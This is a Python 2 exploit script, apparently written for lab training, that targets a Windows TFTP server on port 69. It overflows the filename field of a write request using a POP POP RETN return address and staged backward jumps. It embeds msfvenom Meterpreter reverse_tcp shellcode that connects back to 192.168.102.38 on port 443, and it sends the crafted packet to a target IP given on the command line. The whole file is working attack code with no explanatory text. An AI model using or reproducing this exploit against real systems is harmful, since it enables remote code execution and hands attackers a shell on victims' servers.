#! /usr/bin/python
import struct
import socket
import sys

port = 69

def valid_ip(s):
    if len(sys.argv) > 1:
        a = s.split('.')
        if len(a) != 4:
            return False
        for i in a:
            if not i.isdigit():
                return False
            octect = int(i)
            if octect < 0 or octect > 255:
                return False
        return True
    else:
        return False

if valid_ip(sys.argv[1]):

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except:
        print "socket() failed"
        sys.exit(1)

    host = sys.argv[1]

    # POP POP RETN in TFTP exe
    retaddr = struct.pack('<I', 0x0040CB62)
    
    # Jump back by 32 bytes, to land in Stage 2.
    stage1 = '\xeb\xde\x90\x90'
    
    # Stage 2: Jump back by 368 bytes (length of msfvenom payload), to land in Stage 3.
    stage2 = '\xE9\x8B\xFE\xFF\xFF'
    stage2 += '\xcc' * (32 - len(stage2))
    
    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.102.38 LPORT=443 -b '\x00\x2f' -f python
    # 368 bytes
    buf = ""
    buf += "\xdd\xc7\xb8\x36\x49\xc6\x9e\xd9\x74\x24\xf4\x5b\x33"
    buf += "\xc9\xb1\x56\x31\x43\x18\x03\x43\x18\x83\xc3\x32\xab"
    buf += "\x33\x62\xd2\xa9\xbc\x9b\x22\xce\x35\x7e\x13\xce\x22"
    buf += "\x0a\x03\xfe\x21\x5e\xaf\x75\x67\x4b\x24\xfb\xa0\x7c"
    buf += "\x8d\xb6\x96\xb3\x0e\xea\xeb\xd2\x8c\xf1\x3f\x35\xad"
    buf += "\x39\x32\x34\xea\x24\xbf\x64\xa3\x23\x12\x99\xc0\x7e"
    buf += "\xaf\x12\x9a\x6f\xb7\xc7\x6a\x91\x96\x59\xe1\xc8\x38"
    buf += "\x5b\x26\x61\x71\x43\x2b\x4c\xcb\xf8\x9f\x3a\xca\x28"
    buf += "\xee\xc3\x61\x15\xdf\x31\x7b\x51\xe7\xa9\x0e\xab\x14"
    buf += "\x57\x09\x68\x67\x83\x9c\x6b\xcf\x40\x06\x50\xee\x85"
    buf += "\xd1\x13\xfc\x62\x95\x7c\xe0\x75\x7a\xf7\x1c\xfd\x7d"
    buf += "\xd8\x95\x45\x5a\xfc\xfe\x1e\xc3\xa5\x5a\xf0\xfc\xb6"
    buf += "\x05\xad\x58\xbc\xab\xba\xd0\x9f\xa3\x0f\xd9\x1f\x33"
    buf += "\x18\x6a\x53\x01\x87\xc0\xfb\x29\x40\xcf\xfc\x38\x46"
    buf += "\xf0\xd3\x82\x07\x0e\xd4\xf2\x0e\xd5\x80\xa2\x38\xfc"
    buf += "\xa8\x29\xb9\x01\x7d\xc7\xb3\x95\xbe\xbf\xa2\x43\x57"
    buf += "\xbd\x2a\x8d\x1c\x48\xcc\xdd\x32\x1a\x41\x9e\xe2\xda"
    buf += "\x31\x76\xe9\xd5\x6e\x66\x12\x3c\x07\x0d\xfd\xe8\x7f"
    buf += "\xba\x64\xb1\xf4\x5b\x68\x6c\x71\x5b\xe2\x84\x85\x12"
    buf += "\x03\xed\x95\x43\x74\x0d\x66\x94\x11\x0d\x0c\x90\xb3"
    buf += "\x5a\xb8\x9a\xe2\xac\x67\x64\xc1\xaf\x60\x9a\x94\x99"
    buf += "\x1b\xad\x02\xa5\x73\xd2\xc2\x25\x84\x84\x88\x25\xec"
    buf += "\x70\xe9\x76\x09\x7f\x24\xeb\x82\xea\xc7\x5d\x76\xbc"
    buf += "\xaf\x63\xa1\x8a\x6f\x9c\x84\x88\x68\x62\x5a\xa7\xd0"
    buf += "\x0a\xa4\xf7\xe0\xca\xce\xf7\xb0\xa2\x05\xd7\x3f\x02"
    buf += "\xe5\xf2\x17\x0a\x6c\x93\xda\xab\x71\xbe\xbb\x75\x71"
    buf += "\x4d\x60\x86\x08\x3e\x97\x67\xed\x56\xfc\x68\xed\x56"
    buf += "\x02\x55\x3b\x6f\x70\x98\xff\xd4\x8b\xaf\xa2\x7d\x06"
    buf += "\xcf\xf1\x7e\x03"
    
    # The actual shellcode
    stage3 = ''
    stage3 += '\x90' * (1196 - len(buf))
    stage3 += buf
   
    # Constructed filename
    filename = ''
    filename += stage3
    filename += stage2
    filename += stage1
    filename += retaddr
    filename += 'B' * (5000 - len(stage1) - len(stage2) - len(stage3) - len(retaddr))
    
    mode = "netascii"
    muha = "\x00\x02" + filename + "\0" + mode+ "\0"
    s.sendto(muha, (host, port))

else:

    print "Usage: " + sys.argv[0] + " IP"
    print "Example: " + sys.argv[0] + " 10.11.1"
